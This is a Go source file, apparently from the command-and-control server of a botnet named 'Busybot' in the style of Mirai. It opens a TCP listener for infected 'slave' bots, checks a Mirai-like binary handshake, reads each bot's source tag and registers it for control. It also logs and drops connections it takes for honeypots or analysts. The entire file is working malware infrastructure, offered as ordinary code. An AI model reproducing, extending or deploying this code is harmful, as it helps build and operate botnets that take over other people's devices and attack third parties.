package handle

import (
        "os"
        "fmt"
        "net"
        "time"

        "busybot/core/config"
)

var ClientLists *ClientList = NewClientList()

func InitBots(config *config.Config) {
    tel, err := net.Listen("tcp", config.Masters.Bot.Host)
    fmt.Println("[Busybot] - Slave listener connection was successfully started on '"+config.Masters.Bot.Host+"'.")
    if err != nil {
        fmt.Println(err)
        os.Exit(0)
    }

    for {
        conn, err := tel.Accept()
        if err != nil {
            fmt.Println(err)
            os.Exit(0)
        }

        go initialHandler(conn)
    }
}

func initialHandler(conn net.Conn) {
    defer conn.Close()

    conn.SetDeadline(time.Now().Add(10 * time.Second))

    buf := make([]byte, 32)
    l, err := conn.Read(buf)
    if err != nil || l <= 0 {
        return
    }

    if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
        if buf[3] > 0 {
            string_len := make([]byte, 1)
            l, err := conn.Read(string_len)
            if err != nil || l <= 0 {
                    return
            }
            var source string
            if string_len[0] > 0 {
                source_buf := make([]byte, string_len[0])
                l, err := conn.Read(source_buf)
                if err != nil || l <= 0 {
                    return
                }
                source = string(source_buf)
            }
            NewBot(conn, buf[3], source).Handle()
        } else {
            fmt.Println("[Busybot] - Caught a possible honeypot, or server, or a client trying to connect, bailing..")
        }
    } else {
        fmt.Println("[Busybot] - Caught a possible honeypot, or server, or a client trying to connect, bailing..")
    }
}
